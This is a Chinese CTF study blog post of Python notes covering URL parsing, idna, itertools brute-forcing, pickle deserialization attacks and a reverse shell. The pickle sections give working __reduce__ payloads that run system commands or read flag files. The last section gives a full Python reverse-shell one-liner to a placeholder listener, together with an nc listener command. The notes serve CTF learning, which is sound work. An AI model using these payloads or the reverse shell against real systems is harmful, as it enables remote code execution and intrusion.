---
title: Web杂项2_python及相关
abbrlink: '25872174'
date: 2022-10-23 17:26:25
cover: false
tags:
  - CTF-Web
  - Python
categories:
  - CTF
  - Web安全
typora-root-url: ..
---



# 常用命令备忘

```
os.popen("cat /this_is_the_flag.txt").read() 执行系统命令读取文件
print(os.listdir('/')) 读取某个目录
os.system("cmd")执行系统命令
```





# URL和URL解析

关于URL: 完整格式为:

```
scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]
协议://用户:密码@主机host:端口/路径path#片段
```

所以,在`"https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example"` 中:

**`host`部分就是`www.baidu.com`**

关于Python的`urllib.parse.urlparse`和`urllib.parse.urlsplit`   **都是用来解析url的,前者粒度更细:**

`urllib.parse.urlparse`解析后的结果中包含:

| 属性       | 索引 | 值                               | 值（如果不存在）                                             |
| :--------- | :--- | :------------------------------- | :----------------------------------------------------------- |
| `scheme`   | 0    | URL 协议说明符                   | *scheme* 参数                                                |
| `netloc`   | 1    | 网络位置部分                     | 空字符串                                                     |
| `path`     | 2    | 分层路径                         | 空字符串                                                     |
| `params`   | 3    | Parameters for last path element | 空字符串                                                     |
| `query`    | 4    | 查询组件                         | 空字符串                                                     |
| `fragment` | 5    | 片段标识符                       | 空字符串                                                     |
| `username` |      | 用户名                           | [`None`](https://docs.python.org/zh-cn/3/library/constants.html#None) |
| `password` |      | 密码                             | [`None`](https://docs.python.org/zh-cn/3/library/constants.html#None) |
| `hostname` |      | 主机名（小写）                   | [`None`](https://docs.python.org/zh-cn/3/library/constants.html#None) |
| `port`     |      | 端口号为整数（如果存在）         | [`None`](https://docs.python.org/zh-cn/3/library/constants.html#None) |

```python
from urllib.parse import urlsplit, urlparse
url = "https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example"
print(urlsplit(url))
"""
SplitResult(
    scheme='https', 
    netloc='username:password@www.baidu.com:80', 
    path='/index.html;parameters', 
    query='name=tom', 
    fragment='example')
"""

print(urlparse(url))
"""
ParseResult(
    scheme='https', 
    netloc='username:password@www.baidu.com:80', 
    path='/index.html', 
    params='parameters', 
    query='name=tom', 
    fragment='example'
)
"""
```





## unquote和quote

- `urllib.unquote(要被解码的字符串)`(py2中)    `urllib.parse.unquote(要被解码的字符串)` (py3中)   对字符串进行url解码
- `urllib.quote(要被编码的字符串)`(py2中)    `urllib.parse.quote(要被编码的字符串)` (py3中)   对字符串进行url编码







# idna

```
idna.encode(string)
或者
string.encode('idna') 可以将unicode字符规范化为一般的ascii字符
例如可以把:
suctf.cⅽ 转化为 suctf.cc
```





# 迭代工具itertools

代替多层`for`的功能

**排列组合迭代器：**

| 迭代器                                                       | 实参                 | 结果                                  |
| :----------------------------------------------------------- | :------------------- | :------------------------------------ |
| [`product()`](https://docs.python.org/zh-cn/3/library/itertools.html#itertools.product) | p, q, ... [repeat=1] | 笛卡尔积，相当于嵌套的for循环         |
| [`permutations()`](https://docs.python.org/zh-cn/3/library/itertools.html#itertools.permutations) | p[, r]               | 长度r元组，所有可能的排列，无重复元素 |
| [`combinations()`](https://docs.python.org/zh-cn/3/library/itertools.html#itertools.combinations) | p, r                 | 长度r元组，有序，无重复元素           |
| [`combinations_with_replacement()`](https://docs.python.org/zh-cn/3/library/itertools.html#itertools.combinations_with_replacement) | p, r                 | 长度r元组，有序，元素可重复           |

| 例子                                       | 结果                                              |
| :----------------------------------------- | :------------------------------------------------ |
| `product('ABCD', repeat=2)`                | `AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DD` |
| `permutations('ABCD', 2)`                  | `AB AC AD BA BC BD CA CB CD DA DB DC`             |
| `combinations('ABCD', 2)`                  | `AB AC AD BC BD CD`                               |
| `combinations_with_replacement('ABCD', 2)` | `AA AB AC AD BB BC BD CC CD DD`                   |



例如: 下面的脚本用于爆破md5值开头六位为'6d0bc1'的字符串

```python
from hashlib import md5
import itertools

chars = [chr(i) for i in range(32,128)]

for s in itertools.product(chars, repeat=4):
    # 此迭代器product可以叠加笛卡尔积,repeat设为4,也就是chars中字符的任意4位组合
    m = "".join(s)
    if md5(m.encode()).hexdigest()[:6] == '6d0bc1':
        print(m)
# 学到了,利用itertools.product来迭代任意组合,只用for的话需要嵌套才能做到

#执行结果:
 Rbl
RhPd
d`H6
kX!}
```

`itertools.permutations`:可以拿来遍历一个数组中所有元素的所有可能组合:

```python
import itertools
scramble = ["{hey", "_boy", "aaaa", "s_im", "ck!}", "_baa", "aaaa", "pctf"]
maybe = itertools.permutations(scramble) # 返回一个迭代器,其中的每一个元素都是列表(和上面不同的排列顺序)

for i in maybe:
    flag = ''.join(i)
    if flag.startswith('pctf{hey_boys') and flag.endswith('ck!}'):
        print(flag)
        
输出:
pctf{hey_boys_imaaaa_baaaaaack!}
pctf{hey_boys_imaaaaaaaa_baack!}
pctf{hey_boys_im_baaaaaaaaaack!}
pctf{hey_boys_im_baaaaaaaaaack!}
pctf{hey_boys_imaaaaaaaa_baack!}
pctf{hey_boys_imaaaa_baaaaaack!}
```







***

# PYTHON的pickle反序列化

>`pickle`提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。
>
>`pickle`模块只能在python中使用，`python`中**几乎所有的数据类型（列表，字典，集合，类等）都可以用`pickle`来序列化**， `pickle`序列化后的数据，可读性差，人一般无法识别。
>
>`p = pickle.loads(urllib.unquote(become))`
>
>`urllib.unquote`:将存入的字典参数编码为URL查询字符串，即转换成以`key1 = value1 & key2 = value2`的形式
>
>`pickle.loads(bytes_object): `从字节对象中读取被封装的对象，并返回



`pickle`中常用的函数包括:

```
import cPickle / import pickle
pickle.dump(obj, file, [,protocol])  将obj对象序列化存入已经打开的file中(序列化)
obj：想要序列化的obj对象。
file:文件名称。
protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。

pickle.load(file) 将file中的对象序列化读出 (反序列化,生成对象)
file：文件名称。

pickle.dumps(obj[, protocol])  将obj对象序列化为string形式，而不是存入文件中 (对象--字符串)
obj：想要序列化的obj对象。
protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。

pickle.loads(string)   从string中读出序列化前的obj对象(字符串--对象)
string：要反序列化的字符串

dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。
```

![image-20221025210509727](/images/python-and-others/image-20221025210509727.png)

当在代码中发现`pickle.loads(string)`这样的函数时, 可以构建一个类类里面的`__reduce__`魔术方法会在该类被反序列化(也就是`pickle.loads`被执行)的时候会被调用

那么我们就可以自己构建一个具有`__reduce__`方法的类, 然后将这个类的对象序列化为字符串, 再将这个字符串传给有漏洞的目标进行反序列化,从而执行我们的命令

例如:

```python
#encoding: utf-8
import os
import pickle


class test(object):
    def __reduce__(self):
        return (os.system,('whoami',))
a = test()
payload = pickle.dumps(a)
print(payload)
pickle.loads(payload)
#输出: 
# b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
# laptop-sad7r74j\86139
# 可以看到在执行`pickle.loads`成功调用了`__reduce__`魔术方法,并执行了系统命令

```



**这里注意一个坑, py3和py2 使用`pickle.dumps`得到的字符串是不一样的**, 这道题[[CISCN2019 华北赛区 Day1 Web2]ikun](4f3ccb8a.html)卡了很久: 

py3中:`urllib.parse.quote`

py2中:`urllib.quote`

`python3`:

```python
import pickle
import urllib.parse
class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))
a = pickle.dumps(payload())
print(a)
a = urllib.parse.quote(a)
print(a)
输出:
    #b"\x80\x04\x958\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04eval\x94\x93\x94\x8c\x1copen('/flag.txt','r').read()\x94\x85\x94R\x94."
#%80%04%958%00%00%00%00%00%00%00%8C%08builtins%94%8C%04eval%94%93%94%8C%1Copen%28%27/flag.txt%27%2C%27r%27%29.read%28%29%94%85%94R%94.
```

`python2`:

```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
print a
a = urllib.quote(a)
print a

"""
输出:
c__builtin__
eval
p0
(S"open('/flag.txt','r').read()"
p1
tp2
Rp3
.

c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.

"""

```

其他可用的payload:

这里使用的是`__reduce_ex__`:

```python
#encoding: utf-8
import os
import pickle
class test(object):
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce_ex__(self,cmd):
        return (os.system,(self.cmd,))
a=test('whoami')
payload=pickle.dumps(a)
print(payload)
pickle.loads(payload)
```

```python
import pickle
import urllib
import commands

class payload(object):
    def __reduce__(self):
        return (commands.getoutput,('ls /',))

a = payload()
print urllib.quote(pickle.dumps(a))
```



***

# python反弹shell

如果当前目标主机能够执行我们的命令,但是没有回显, 可以利用`python`来反弹shell

让目标执行如下命令

```
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('监听主机的ip',监听主机的端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

这里的代码为:

```
import os,socket
subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('监听主机的ip',监听主机的端口))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/bash','-i'])
```

然后在我们能够控制的监听主机上使用:(内网环境下可以在kali上监听其他内网主机的)

```
nc -lvp 端口号 
```

开启监听, 就能够获得目标主机的`shell`了







